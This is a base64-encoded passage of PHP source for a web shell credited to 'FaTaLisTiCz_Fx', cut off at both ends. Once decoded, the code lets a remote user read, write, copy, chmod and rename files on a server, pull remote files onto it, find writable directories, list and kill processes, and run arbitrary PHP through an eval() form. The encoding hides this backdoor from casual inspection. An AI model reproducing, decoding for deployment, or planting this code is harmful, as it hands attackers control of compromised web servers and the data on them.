gICAgICAgICAiPGltZyBzcmM9XCIiLiRzdXJsLiJhY3Q9aW1nJmltZz1hcnJvd19sdHJcIiBib3JkZXI9XCIwXCI+IjsKICAgIGlmIChjb3VudChhcnJheV9tZXJnZSgkc2Vzc19kYXRhWyJjb3B5Il0sJHNlc3NfZGF0YVsiY3V0Il0pKSA+IDAgYW5kICgkdXNlZnNidWZmKSkgewogICAgICBlY2hvICI8aW5wdXQgdHlwZT1zdWJtaXQgbmFtZT1hY3RhcmNidWZmIHZhbHVlPVwiUGFjayBidWZmZXIgdG8gYXJjaGl2ZVwiPiZuYnNwOzxpbnB1dCB0eXBlPVwidGV4dFwiIG5hbWU9XCJhY3RhcmNidWZmX3BhdGhcIiB2YWx1ZT1cImZ4X2FyY2hpdmVfIi5zdWJzdHIobWQ1KHJhbmQoMSwxMDAwKS5yYW5kKDEsMTAwMCkpLDAsNSkuIi50YXIuZ3pcIj4mbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDs8aW5wdXQgdHlwZT1zdWJtaXQgbmFtZT1cImFjdHBhc3RlYnVmZlwiIHZhbHVlPVwiUGFzdGVcIj4mbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDs8aW5wdXQgdHlwZT1zdWJtaXQgbmFtZT1cImFjdGVtcHR5YnVmZlwiIHZhbHVlPVwiRW1wdHkgYnVmZmVyXCI+Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7IjsKICAgIH0KICAgIGVjaG8gIjxzZWxlY3QgbmFtZT1hY3Q+PG9wdGlvbiB2YWx1ZT1cIiIuJGFjdC4iXCI+V2l0aCBzZWxlY3RlZDo8L29wdGlvbj4iOwogICAgZWNobyAiPG9wdGlvbiB2YWx1ZT1kZWxldGUiLigkZHNwYWN0ID09ICJkZWxldGUiPyIgc2VsZWN0ZWQiOiIiKS4iPkRlbGV0ZTwvb3B0aW9uPiI7CiAgICBlY2hvICI8b3B0aW9uIHZhbHVlPWNobW9kIi4oJGRzcGFjdCA9PSAiY2htb2QiPyIgc2VsZWN0ZWQiOiIiKS4iPkNoYW5nZS1tb2RlPC9vcHRpb24+IjsKICAgIGlmICgkdXNlZnNidWZmKSB7CiAgICAgIGVjaG8gIjxvcHRpb24gdmFsdWU9Y3V0Ii4oJGRzcGFjdCA9PSAiY3V0Ij8iIHNlbGVjdGVkIjoiIikuIj5DdXQ8L29wdGlvbj4iOwogICAgICBlY2hvICI8b3B0aW9uIHZhbHVlPWNvcHkiLigkZHNwYWN0ID09ICJjb3B5Ij8iIHNlbGVjdGVkIjoiIikuIj5Db3B5PC9vcHRpb24+IjsKICAgICAgZWNobyAiPG9wdGlvbiB2YWx1ZT11bnNlbGVjdCIuKCRkc3BhY3QgPT0gInVuc2VsZWN0Ij8iIHNlbGVjdGVkIjoiIikuIj5VbnNlbGVjdDwvb3B0aW9uPiI7CiAgICB9CiAgICBlY2hvICI8L3NlbGVjdD4mbmJzcDs8aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9XCJDb25maXJtXCI+PC9kaXY+IjsKICAgIGVjaG8gIjwvZm9ybT4iOwogIH0KfQppZiAoJGFjdCA9PSAidG9vbHMiKSB7IHRvb2xzKCk7IH0KIyNbIFBIUCBGSUxFU1lTVEVNIFRSSUNLWiAoQnkgRmFUYUxpc1RpQ3pfRngpIF0jIwppZiAoJGFjdCA9PSAicGhwZnN5cyIpIHsgCiAgZWNobyAiPGRpdiBhbGlnbj1sZWZ0PiI7CiAgJGZzZnVuYyA9ICRwaHBmc3lzZnVuYzsKICBpZiAoJGZzZnVuYz09ImNvcHkiKSB7CiAgICBpZiAoIWNvcHkoJGFyZzEsICRhcmcyKSkgeyBlY2hvICJGYWlsZWQgdG8gY29weSAkYXJnMS4uLlxuIjt9CiAgICBlbHNlIHsgZWNobyAiPGI+U3VjY2VzcyE8L2I+ICRhcmcxIGNvcGllZCB0byAkYXJnMlxuIjsgfQogIH0KICBlbHNlaWYgKCRmc2Z1bmM9PSJyZW5hbWUiKSB7CiAgICBpZiAoIXJlbmFtZSgkYXJnMSwgJGFyZzIpKSB7IGVjaG8gIkZhaWxlZCB0byByZW5hbWUvbW92ZSAkYXJnMSFcbiI7fQogICAgZWxzZSB7IGVjaG8gIjxiPlN1Y2Nlc3MhPC9iPiAkYXJnMSByZW5hbWVkL21vdmVkIHRvICRhcmcyXG4iOyB9CiAgfQogIGVsc2VpZiAoJGZzZnVuYz09ImNobW9kIikgewogICAgaWYgKCFjaG1vZCgkYXJnMSwkYXJnMikpIHsgZWNobyAiRmFpbGVkIHRvIGNobW9kICRhcmcxIVxuIjt9CiAgICBlbHNlIHsgZWNobyAiPGI+UGVybSBmb3IgJGFyZzEgY2hhbmdlZCB0byAkYXJnMiE8L2I+XG4iOyB9CiAgfQogIGVsc2VpZiAoJGZzZnVuYz09InJlYWQiKSB7CiAgICAkZGFyZyA9ICRkLiRhcmcxOwogICAgaWYgKCRoYXNpbCA9IEBmaWxlX2dldF9jb250ZW50cygkZGFyZykpIHsKICAgICAgZWNobyAiPGI+RmlsZW5hbWU6PC9iPiAiLiRkYXJnLiI8YnI+IjsKICAgICAgZWNobyAiPGNlbnRlcj48dGV4dGFyZWEgY29scz0xMzUgcm93cz0zMD4iOwogICAgICBlY2hvIGh0bWxlbnRpdGllcygkaGFzaWwpOwogICAgICBlY2hvICI8L3RleHRhcmVhPjwvY2VudGVyPlxuIjsKICAgIH0KICAgIGVsc2UgeyBlY2hvICI8ZGl2IGNsYXNzPWZ4ZXJybXNnPiBDb3VsZG4ndCBvcGVuICIuJGRhcmcuIjxkaXY+IjsgfQogIH0KICBlbHNlaWYgKCRmc2Z1bmM9PSJ3cml0ZSIpIHsKICAgICRkYXJnID0gJGQuJGFyZzE7CiAgICBpZihAZmlsZV9wdXRfY29udGVudHMoJGRhcmcsJGFyZzIpKSB7CiAgICAgIGVjaG8gIjxiPlNhdmVkITwvYj4gIi4kZGFyZzsKICAgIH0KICAgIGVsc2UgeyBlY2hvICI8ZGl2IGNsYXNzPWZ4ZXJybXNnPkNhbid0IHdyaXRlIHRvICRkYXJnITwvZGl2PiI7IH0KICB9CiAgZWxzZWlmICgkZnNmdW5jPT0iZG93bmxvYWRiaW4iKSB7CiAgICAkaGFuZGxlID0gZm9wZW4oJGFyZzEsICJyYiIpOwogICAgJGNvbnRlbnRzID0gJyc7CiAgICB3aGlsZSAoIWZlb2YoJGhhbmRsZSkpIHsKICAgICAgJGNvbnRlbnRzIC49IGZyZWFkKCRoYW5kbGUsIDgxOTIpOwogICAgfQogICAgJHIgPSBAZm9wZW4oJGQuJGFyZzIsJ3cnKTsKICAgIGlmIChmd3JpdGUoJHIsJGNvbnRlbnRzKSkgeyBlY2hvICI8Yj5TdWNjZXNzITwvYj4gJGFyZzEgc2F2ZWQgdG8gIi4kZC4kYXJnMi4iICgiLnZpZXdfc2l6ZShmaWxlc2l6ZSgkZC4kYXJnMikpLiIpIjsgfQogICAgZWxzZSB7IGVjaG8gIjxkaXYgY2xhc3M9ZnhlcnJtc2c+Q2FuJ3Qgd3JpdGUgdG8gIi4kZC4kYXJnMi4iITwvZGl2PiI7IH0KICAgIGZjbG9zZSgkcik7CiAgICBmY2xvc2UoJGhhbmRsZSk7CiAgfQogIGVsc2VpZiAoJGZzZnVuYz09ImRvd25sb2FkIikgewogICAgJHRleHQgPSBpbXBsb2RlKCcnLCBmaWxlKCRhcmcxKSk7CiAgICBpZiAoJHRleHQpIHsKICAgICAgJHIgPSBAZm9wZW4oJGQuJGFyZzIsJ3cnKTsKICAgICAgaWYgKGZ3cml0ZSgkciwkdGV4dCkpIHsgZWNobyAiPGI+U3VjY2VzcyE8L2I+ICRhcmcxIHNhdmVkIHRvICIuJGQuJGFyZzIuIiAoIi52aWV3X3NpemUoZmlsZXNpemUoJGQuJGFyZzIpKS4iKSI7IH0KICAgICAgZWxzZSB7IGVjaG8gIjxkaXYgY2xhc3M9ZnhlcnJtc2c+Q2FuJ3Qgd3JpdGUgdG8gIi4kZC4kYXJnMi4iITwvZGl2PiI7IH0KICAgICAgZmNsb3NlKCRyKTsKICAgIH0KICAgIGVsc2UgeyBlY2hvICI8ZGl2IGNsYXNzPWZ4ZXJybXNnPkNhbid0IGRvd25sb2FkIGZyb20gJGFyZzEhPC9kaXY+Ijt9CiAgfQogIGVsc2VpZiAoJGZzZnVuYz09J21rZGlyJykgewogICAgJHRoZWRpciA9ICRkLiRhcmcxOwogICAgaWYgKCR0aGVkaXIgIT0gJGQpIHsKICAgICAgaWYgKGZpbGVfZXhpc3RzKCR0aGVkaXIpKSB7IGVjaG8gIjxiPkFscmVhZHkgZXhpc3RzOjwvYj4gIi5odG1sc3BlY2lhbGNoYXJzKCR0aGVkaXIpOyB9CiAgICAgIGVsc2VpZiAoIW1rZGlyKCR0aGVkaXIpKSB7IGVjaG8gIjxiPkFjY2VzcyBkZW5pZWQ6PC9iPiAiLmh0bWxzcGVjaWFsY2hhcnMoJHRoZWRpcik7IH0KICAgICAgZWxzZSB7IGVjaG8gIjxiPkRpciBjcmVhdGVkOjwvYj4gIi5odG1sc3BlY2lhbGNoYXJzKCR0aGVkaXIpO30KICAgIH0KICAgIGVsc2UgeyBlY2hvICJDYW4ndCBjcmVhdGUgY3VycmVudCBkaXI6PGI+ICR0aGVkaXI8L2I+IjsgfQogIH0KICBlbHNlaWYgKCRmc2Z1bmM9PSdmd3JpdGFibGVkaXInKSB7CiAgICBmdW5jdGlvbiByZWN1cnNlX2RpcigkZGlyLCRtYXhfZGlyKSB7CiAgICAgIGdsb2JhbCAkZGlyX2NvdW50OwogICAgICAkZGlyX2NvdW50Kys7CiAgICAgIGlmKCAkY2RpciA9IGRpcigkZGlyKSApIHsKICAgICAgICB3aGlsZSggJGVudHJ5ID0gJGNkaXItPiByZWFkKCkgKSB7CiAgICAgICAgICBpZiggJGVudHJ5ICE9ICcuJyAmJiAkZW50cnkgIT0gJy4uJyApIHsKICAgICAgICAgICAgaWYoaXNfZGlyKCRkaXIuJGVudHJ5KSAmJiBpc193cml0YWJsZSgkZGlyLiRlbnRyeSkgKSB7CiAgICAgICAgICAgICBpZiAoJGRpcl9jb3VudCA+ICRtYXhfZGlyKSB7IHJldHVybjsgfQogICAgICAgICAgICAgIGVjaG8gIlsiLiRkaXJfY291bnQuIl0gIi4kZGlyLiRlbnRyeS4iXG4iOwogICAgICAgICAgICAgIHJlY3Vyc2VfZGlyKCRkaXIuJGVudHJ5LkRJUkVDVE9SWV9TRVBBUkFUT1IsJG1heF9kaXIpOwogICAgICAgICAgICB9CiAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgICRjZGlyLT5jbG9zZSgpOwogICAgICB9CiAgICB9CiAgICBpZiAoISRhcmcxKSB7ICRhcmcxID0gJGQ7IH0KICAgIGlmICghJGFyZzIpIHsgJGFyZzIgPSAxMDsgfQogICAgaWYgKGlzX2RpcigkYXJnMSkpIHsKICAgICAgZWNobyAiPGI+V3JpdGFibGUgZGlyZWN0b3JpZXMgKE1heDogJGFyZzIpIGluOjwvYj4gJGFyZzE8aHIgbm9zaGFkZSBzaXplPTE+IjsKICAgICAgZWNobyAiPHByZT4iOwogICAgICByZWN1cnNlX2RpcigkYXJnMSwkYXJnMik7CiAgICAgIGVjaG8gIjwvcHJlPiI7CiAgICAgICR0b3RhbCA9ICRkaXJfY291bnQgLSAxOwogICAgICBlY2hvICI8aHIgbm9zaGFkZSBzaXplPTE+PGI+Rm91bmRzOjwvYj4gIi4kdG90YWwuIiBvZiA8Yj5NYXg8L2I+ICRhcmcyIjsKICAgIH0KICAgIGVsc2UgewogICAgICBlY2hvICI8ZGl2IGNsYXNzPWZ4ZXJybXNnPkRpcmVjdG9yeSBpcyBub3QgZXhpc3Qgb3IgcGVybWlzc2lvbiBkZW5pZWQhPC9kaXY+IjsKICAgIH0KICB9CiAgZWxzZSB7CiAgICBpZiAoISRhcmcxKSB7IGVjaG8gIjxkaXYgY2xhc3M9ZnhlcnJtc2c+Tm8gb3BlcmF0aW9uISBQbGVhc2UgZmlsbCBwYXJhbWV0ZXIgW0FdITwvZGl2PlxuIjsgfQogICAgZWxzZSB7CiAgICAgIGlmICgkaGFzaWwgPSAkZnNmdW5jKCRhcmcxKSkgewogICAgICAgIGVjaG8gIjxiPlJlc3VsdCBvZiAkZnNmdW5jICRhcmcxOjwvYj48YnI+IjsKICAgICAgICBpZiAoIWlzX2FycmF5KCRoYXNpbCkpIHsgZWNobyAiJGhhc2lsXG4iOyB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICBlY2hvICI8cHJlPiI7CiAgICAgICAgICBmb3JlYWNoICgkaGFzaWwgYXMgJHYpIHsgZWNobyAkdi4iXG4iOyB9CiAgICAgICAgICBlY2hvICI8L3ByZT4iOwogICAgICAgIH0KICAgICAgfQogICAgICBlbHNlIHsgZWNobyAiPGRpdiBjbGFzcz1meGVycm1zZz4kZnNmdW5jICRhcmcxIGZhaWxlZCE8L2Rpdj5cbiI7IH0KICAgIH0KICB9CiAgZWNobyAiPC9kaXY+XG4iOwp9CmlmICgkYWN0ID09ICJwcm9jZXNzZXMiKSB7CiAgZWNobyAiPGRpdiBjbGFzcz1iYXJoZWFkZXI+LjogUHJvY2Vzc2VzIDouPC9kaXY+XG4iOwogIGlmICghJHdpbikgeyAkaGFuZGxlciA9ICJwcyBhdXgiLigkZ3JlcD8iIHwgZ3JlcCAnIi5hZGRzbGFzaGVzKCRncmVwKS4iJyI6IiIpOyB9CiAgZWxzZSB7ICRoYW5kbGVyID0gInRhc2tsaXN0IjsgfQogICRyZXQgPSBmeDI5ZXhlYygkaGFuZGxlcik7CiAgaWYgKCEkcmV0KSB7IGVjaG8gIkNhbid0IGV4ZWN1dGUgXCIiLiRoYW5kbGVyLiJcIiEiOyB9CiAgZWxzZSB7CiAgICBpZiAoZW1wdHkoJHByb2Nlc3Nlc19zb3J0KSkgeyAkcHJvY2Vzc2VzX3NvcnQgPSAkc29ydF9kZWZhdWx0OyB9CiAgICAkcGFyc2Vzb3J0ID0gcGFyc2Vzb3J0KCRwcm9jZXNzZXNfc29ydCk7CiAgICBpZiAoIWlzX251bWVyaWMoJHBhcnNlc29ydFswXSkpIHskcGFyc2Vzb3J0WzBdID0gMDt9CiAgICAkayA9ICRwYXJzZXNvcnRbMF07CiAgICBpZiAoJHBhcnNlc29ydFsxXSAhPSAiYSIpIHsKICAgICAgJHkgPSAiPGEgaHJlZj1cIiIuJHN1cmwuImFjdD0iLiRkc3BhY3QuIiZkPSIudXJsZW5jb2RlKCRkKS4iJnByb2Nlc3Nlc19zb3J0PSIuJGsuImFcIj48aW1nIHNyYz1cIiIuJHN1cmwuImFjdD1pbWcmaW1nPXNvcnRfZGVzY1wiIGJvcmRlcj1cIjBcIj48L2E+IjsKICAgIH0KICAgIGVsc2UgewogICAgICAkeSA9ICI8YSBocmVmPVwiIi4kc3VybC4iYWN0PSIuJGRzcGFjdC4iJmQ9Ii51cmxlbmNvZGUoJGQpLiImcHJvY2Vzc2VzX3NvcnQ9Ii4kay4iZFwiPjxpbWcgc3JjPVwiIi4kc3VybC4iYWN0PWltZyZpbWc9c29ydF9hc2NcIiBoZWlnaHQ9XCI5XCIgd2lkdGg9XCIxNFwiIGJvcmRlcj1cIjBcIj48L2E+IjsKICAgIH0KICAgICRyZXQgPSBodG1sc3BlY2lhbGNoYXJzKCRyZXQpOwogICAgaWYgKCEkd2luKSB7IC8vTm90IFdpbmRvd3MKICAgICAgaWYgKCRwaWQpIHsKICAgICAgICBpZiAoaXNfbnVsbCgkc2lnKSkgeyAkc2lnID0gOTsgfQogICAgICAgIGVjaG8gIlNlbmRpbmcgc2lnbmFsICIuJHNpZy4iIHRvICMiLiRwaWQuIi4uLiAiOwogICAgICAgIGlmIChwb3NpeF9raWxsKCRwaWQsJHNpZykpIHsgZWNobyAiT0suIjsgfSBlbHNlIHsgZWNobyAiRVJST1IuIjsgfQogICAgICB9CiAgICAgIHdoaWxlIChlcmVnKCIgICIsJHJldCkpIHsgJHJldCA9IHN0cl9yZXBsYWNlKCIgICIsIiAiLCRyZXQpOyB9CiAgICAgICRzdGFjayA9IGV4cGxvZGUoIlxuIiwkcmV0KTsKICAgICAgJGhlYWQgPSBleHBsb2RlKCIgIiwkc3RhY2tbMF0pOwogICAgICB1bnNldCgkc3RhY2tbMF0pOwogICAgICBmb3IoJGk9MDskaTxjb3VudCgkaGVhZCk7JGkrKykgewogICAgICAgIGlmICgkaSAhPSAkaykgewogICAgICAgICAgJGhlYWRbJGldID0gIjxhIGhyZWY9XCIiLiRzdXJsLiJhY3Q9Ii4kZHNwYWN0LiImZD0iLnVybGVuY29kZSgkZCkuIiZwcm9jZXNzZXNfc29ydD0iLiRpLiRwYXJzZXNvcnRbMV0uIlwiPjxiPiIuJGhlYWRbJGldLiI8L2I+PC9hPiI7CiAgICAgICAgfQogICAgICB9CiAgICAgICRoZWFkWyRpXSA9ICIiOwogICAgICAkcHJjcyA9IGFycmF5KCk7CiAgICAgIGZvcmVhY2ggKCRzdGFjayBhcyAkbGluZSkgewogICAgICAgIGlmICghZW1wdHkoJGxpbmUpKSB7CiAgICAgICAgICAkbGluZSA9IGV4cGxvZGUoIiAiLCRsaW5lKTsKICAgICAgICAgICRsaW5lWzEwXSA9IGpvaW4oIiAiLGFycmF5X3NsaWNlKCRsaW5lLDEwKSk7CiAgICAgICAgICAkbGluZSA9IGFycmF5X3NsaWNlKCRsaW5lLDAsMTEpOwogICAgICAgICAgaWYgKCRsaW5lWzBdID09IGdldF9jdXJyZW50X3VzZXIoKSkgeyAkbGluZVswXSA9ICI8Zm9udCBjb2xvcj1ncmVlbj4iLiRsaW5lWzBdLiI8L2ZvbnQ+IjsgfQogICAgICAgICAgJGxpbmVbXSA9ICI8YSBocmVmPVwiIi4kc3VybC4iYWN0PXByb2Nlc3NlcyZkPSIudXJsZW5jb2RlKCRkKS4iJnBpZD0iLiRsaW5lWzFdLiImc2lnPTlcIj48dT5LSUxMPC91PjwvYT4iOwogICAgICAgICAgJHByY3NbXSA9ICRsaW5lOwogICAgICAgIH0KICAgICAgfQogICAgfQogICAgLy9Gb3IgV2luZG93cyAtIEZpeGVkIEJ5IEZhVGFMaXNUaUN6X0Z4CiAgICBlbHNlIHsKICAgICAgd2hpbGUgKGVyZWcoIiAgIiwkcmV0KSkgeyAkcmV0ID0gc3RyX3JlcGxhY2UoIiAgIiwiICIsJHJldCk7IH0KICAgICAgd2hpbGUgKGVyZWcoIj0iLCRyZXQpKSB7ICRyZXQgPSBzdHJfcmVwbGFjZSgiPSIsIiIsJHJldCk7IH0KICAgICAgJHJldCA9IGNvbnZlcnRfY3lyX3N0cmluZygkcmV0LCJkIiwidyIpOwogICAgICAkc3RhY2sgPSBleHBsb2RlKCJcbiIsJHJldCk7CiAgICAgIHVuc2V0KCRzdGFja1swXSwkc3RhY2tbMl0pOwogICAgICAkc3RhY2sgPSBhcnJheV92YWx1ZXMoJHN0YWNrKTsKICAgICAgJHN0YWNrWzBdPXN0cl9yZXBsYWNlKCJJbWFnZSBOYW1lIiwiSW1hZ2VOYW1lIiwkc3RhY2tbMF0pOwogICAgICAkc3RhY2tbMF09c3RyX3JlcGxhY2UoIlNlc3Npb24gTmFtZSIsIlNlc3Npb25OYW1lIiwkc3RhY2tbMF0pOwogICAgICAkc3RhY2tbMF09c3RyX3JlcGxhY2UoIk1lbSBVc2FnZSIsIk1lbW9yeVVzYWdlIiwkc3RhY2tbMF0pOwogICAgICAkaGVhZCA9IGV4cGxvZGUoIiAiLCRzdGFja1swXSk7CiAgICAgICRzdGFjayA9IGFycmF5X3NsaWNlKCRzdGFjaywxKTsKICAgICAgJGhlYWQgPSBhcnJheV92YWx1ZXMoJGhlYWQpOwogICAgICBpZiAoJHBhcnNlc29ydFsxXSAhPSAiYSIpIHsgJHkgPSAiPGEgaHJlZj1cIiIuJHN1cmwuImFjdD0iLiRkc3BhY3QuIiZkPSIudXJsZW5jb2RlKCRkKS4iJnByb2Nlc3Nlc19zb3J0PSIuJGsuImFcIj48aW1nIHNyYz1cIiIuJHN1cmwuImFjdD1pbWcmaW1nPXNvcnRfZGVzY1wiIGJvcmRlcj1cIjBcIj48L2E+IjsgfQogICAgICBlbHNlIHsgJHkgPSAiPGEgaHJlZj1cIiIuJHN1cmwuImFjdD0iLiRkc3BhY3QuIiZkPSIudXJsZW5jb2RlKCRkKS4iJnByb2Nlc3Nlc19zb3J0PSIuJGsuImRcIj48aW1nIHNyYz1cIiIuJHN1cmwuImFjdD1pbWcmaW1nPXNvcnRfYXNjXCIgYm9yZGVyPVwiMFwiPjwvYT4iOyB9CiAgICAgIGlmICgkayA+IGNvdW50KCRoZWFkKSkgeyRrID0gY291bnQoJGhlYWQpLTE7fQogICAgICBmb3IoJGk9MDskaTxjb3VudCgkaGVhZCk7JGkrKykgewogICAgICAgIGlmICgkaSAhPSAkaykgeyAkaGVhZFskaV0gPSAiPGEgaHJlZj1cIiIuJHN1cmwuImFjdD0iLiRkc3BhY3QuIiZkPSIudXJsZW5jb2RlKCRkKS4iJnByb2Nlc3Nlc19zb3J0PSIuJGkuJHBhcnNlc29ydFsxXS4iXCI+PGI+Ii50cmltKCRoZWFkWyRpXSkuIjwvYj48L2E+IjsgfQogICAgICB9CiAgICAgICRwcmNzID0gYXJyYXkoKTsKICAgICAgdW5zZXQoJHN0YWNrWzBdKTsKICAgICAgZm9yZWFjaCAoJHN0YWNrIGFzICRsaW5lKSB7CiAgICAgICAgaWYgKCFlbXB0eSgkbGluZSkpIHsKICAgICAgICAgICRsaW5lID0gZXhwbG9kZSgiICIsJGxpbmUpOwogICAgICAgICAgJGxpbmVbNF0gPSBzdHJfcmVwbGFjZSgiLiIsIiIsJGxpbmVbNF0pOwogICAgICAgICAgJGxpbmVbNF0gPSBpbnR2YWwoJGxpbmVbNF0pICogMTAyNDsKICAgICAgICAgIHVuc2V0KCRsaW5lWzVdKTsKICAgICAgICAgICRwcmNzW10gPSAkbGluZTsKICAgICAgICB9CiAgICAgIH0KICAgIH0KICAgICRoZWFkWyRrXSA9ICI8Yj4iLiRoZWFkWyRrXS4iPC9iPiIuJHk7CiAgICAkdiA9ICRwcm9jZXNzZXNfc29ydFswXTsKICAgIHVzb3J0KCRwcmNzLCJ0YWJzb3J0Iik7CiAgICBpZiAoJHByb2Nlc3Nlc19zb3J0WzFdID09ICJkIikgeyAkcHJjcyA9IGFycmF5X3JldmVyc2UoJHByY3MpOyB9CiAgICAkdGFiID0gYXJyYXkoKTsKICAgICR0YWJbXSA9ICRoZWFkOwogICAgJHRhYiA9IGFycmF5X21lcmdlKCR0YWIsJHByY3MpOwogICAgZWNobyAiPHRhYmxlIGNsYXNzPWV4cGxvcmVyPlxuIjsKICAgIGZvcmVhY2goJHRhYiBhcyAkaT0+JGspIHsKICAgICAgZWNobyAiPHRyPiI7CiAgICAgIGZvcmVhY2goJGsgYXMgJGo9PiR2KSB7CiAgICAgICAgaWYgKCR3aW4gYW5kICRpID4gMCBhbmQgJGogPT0gNCkgeyAkdiA9IHZpZXdfc2l6ZSgkdik7IH0KICAgICAgICBlY2hvICI8dGQ+Ii4kdi4iPC90ZD4iOwogICAgICB9CiAgICAgIGVjaG8gIjwvdHI+XG4iOwogICAgfQogICAgZWNobyAiPC90YWJsZT4iOwogIH0KfQppZiAoJGFjdCA9PSAiZXZhbCIpIHsKICBpZiAoIWVtcHR5KCRldmFsKSkgewogICAgZWNobyAiUmVzdWx0IG9mIGV4ZWN1dGlvbiB0aGlzIFBIUC1jb2RlOjxicj4iOwogICAgJHRtcCA9IEBvYl9nZXRfY29udGVudHMoKTsKICAgICRvbGRkaXIgPSByZWFscGF0aCgiLiIpOwogICAgQGNoZGlyKCRkKTsKICAgIGlmICgkdG1wKSB7CiAgICAgIEBvYl9jbGVhbigpOwogICAgICBldmFsKCRldmFsKTsKICAgICAgJHJldCA9IEBvYl9nZXRfY29udGVudHMoKTsKICAgICAgJHJldCA9IGNvbnZlcnRfY3lyX3N0cmluZygkcmV0LCJkIiwidyIpOwogICAgICBAb2JfY2xlYW4oKTsKICAgICAgZWNobyAkdG1wOwogICAgICBpZiAoJGV2YWxfdHh0KSB7CiAgICAgICAgJHJvd3MgPSBjb3VudChleHBsb2RlKCJcclxuIiwkcmV0KSkrMTsKICAgICAgICBpZiAoJHJvd3MgPCAxMCkgeyRyb3dzID0gMTA7fQogICAgICAgIGVjaG8gIjxicj48dGV4dGFyZWEgY29scz1cIjExNVwiIHJvd3M9XCIiLiRyb3dzLiJcIiByZWFkb25seT4iLmh0bWxzcGVjaWFsY2hhcnMoJHJldCkuIjwvdGV4dGFyZWE+IjsKICAgICAgfQogICAgICBlbHNlIHtlY2hvICRyZXQuIjxicj4iO30KICAgIH0KICAgIGVsc2UgewogICAgICBpZiAoJGV2YWxfdHh0KSB7CiAgICAgICAgZWNobyAiPGJyPjx0ZXh0YXJlYSBjb2xzPVwiMTE1XCIgcm93cz1cIjE1XCIgcmVhZG9ubHk+IjsKICAgICAgICBldmFsKCRldmFsKTsKICAgICAgICBlY2hvICI8L3RleHRhcmVhPiI7CiAgICAgIH0KICAgICAgZWxzZSB7ZWNobyAkcmV0O30KICAgIH0KICAgIEBjaGRpcigkb2xkZGlyKTsKICB9CiAgZWxzZSB7ZWNobyAiPGI+UEhQLWNvZGUgRXhlY3V0aW9uIChVc2Ugd2l0aG91dCBQSFAgQnJhY2VzISk8L2I+IjsgaWYgKGVtcHR5KCRldmFsX3R4dCkpIHskZXZhbF90eHQgPSBUUlVFO319CiAgZWNobyAiPGZvcm0gYWN0aW9uPVwiIi4kc3VybC4iXCIgbWV0aG9kPVBPU1Q+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9YWN0IHZhbHVlPWV2YWw+PHRleHRhcmVhIG5hbWU9XCJldmFsXCIgY29scz1cIjExNVwiIHJvd3M9XCIxMFwiPiIuaHRtbHNwZWNpYWxjaGFycygkZXZhbCkuIjwvdGV4dGFyZWE+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9XCJkXCIgdmFsdWU9XCIiLiRkaXNwZC4iXCI+PGJyPjxicj48aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9XCJFeGVjdXRlXCI+Jm5ic3A7RGlzcGxheSBpbiB0ZXh0LWFyZWEmbmJzcDs8aW5wdXQgdHlwZT1cImNoZWNrYm94XCIgbmFtZT1cImV2YWxfdHh0XCIgdmFsdWU9XCIxXCIiOyBpZiAoJGV2YWxfdHh0KSB7ZWNobyAiIGNoZWNrZWQiO30gZWNobyAiPjwvZm9ybT4iOwp9CmlmICgkYWN0ID09ICJmIikgewogIGVjaG8gIjxkaXYgYWxpZ249bGVmdD4iOwogIGlmICgoIWlzX3JlYWRhYmxlKCRkLiRmKSBvciBpc19kaXIoJGQuJGYpKSBhbmQgJGZ0ICE9ICJlZGl0IikgewogICAgaWYgKGZpbGVfZXhpc3RzKCRkLiRmKSkge2VjaG8gIjxjZW50ZXI+PGI+UGVybWlzaW9uIGRlbmllZCAoIi5odG1sc3BlY2lhbGNoYXJzKCRkLiRmKS4iKSE8L2I+PC9jZW50ZXI+Ijt9CiAgICBlbHNlIHtlY2hvICI8Y2VudGVyPjxiPkZpbGUgZG9lcyBub3QgZXhpc3RzICgiLmh0bWxzcGVjaWFsY2hhcnMoJGQuJGYpLiIpITwvYj48YnI+PGEgaHJlZj1cIiIuJHN1cmwuImFjdD1mJmY9Ii51cmxlbmNvZGUoJGYpLiImZnQ9ZWRpdCZkPSIudXJsZW5jb2RlKCRkKS4iJmM9MVwiPjx1PkNyZWF0ZTwvdT48L2E+PC9jZW50ZXI+Ijt9CiAgfQogIGVsc2UgewogICAgJHIgPSBAZmlsZV9nZXRfY29udGVudHMoJGQuJGYpOwogICAgJGV4dCA9IGV4cGxvZGUoIi4iLCRmKTsKICAgICRjID0gY291bnQoJGV4dCktMTsKICAgICRleHQgPSAkZXh0WyRjXTsKICAgICRleHQgPSBzdHJ0b2xvd2VyKCRleHQpOwogICAgJHJmdCA9ICIiOwogICAgZm9yZWFjaCgkZnR5cGVzIGFzICRrPT4kdikge2lmIChpbl9hcnJheSgkZXh0LCR2KSkgeyRyZnQgPSAkazsgYnJlYWs7fX0KICAgIGlmIChlcmVnaSgic2Vzc18oLiopIiwkZikpIHskcmZ0ID0gInBocHNlc3MiO30KICAgIGlmIChlbXB0eSgkZnQpKSB7JGZ0ID0gJHJmdDt9CiAgICAkYXJyID0gYXJyYXkoCiAgICAgICAgYXJyYXkoIjxpbWcgc3JjPVwiIi4kc3VybC4iYWN0PWltZyZpbWc9ZXh0X2RpelwiIGJvcmRlcj1cIjBcIj4iLCJpbmZvIiksCiAgICAgICAgYXJyYXkoIjxpbWcgc3JjPVwiIi4kc3VybC4iYWN0PWltZyZpbWc9ZXh0X2h0bWxcIiBib3JkZXI9XCIwXCI+IiwiaHRtbCIpLAogICAgICAgIGFycmF5KCI8aW1nIHNyYz1cIiIuJHN1cmwuImFjdD1pbWcmaW1nPWV4dF90eHRcIiBib3JkZXI9XCIwXCI+IiwidHh0IiksCiAgICAgICAgYXJyYXkoIkNvZGUiLCJjb2RlIiksCiAgICAgICAgYXJyYXkoIlNlc3Npb24iLCJwaHBzZXNzIiksCiAgICAgICAgYXJyYXkoIjxpbWcgc3JjPVwiIi4kc3VybC4iYWN0PWltZyZpbWc9ZXh0X2V4ZVwiIGJvcmRlcj1cIjBcIj4iLCJleGUiKSwKICAgICAgICBhcnJheSgiU0RCIiwic2RiIiksCiAgICAgICAgYXJyYXkoIjxpbWcgc3JjPVwiIi4kc3VybC4iYWN0PW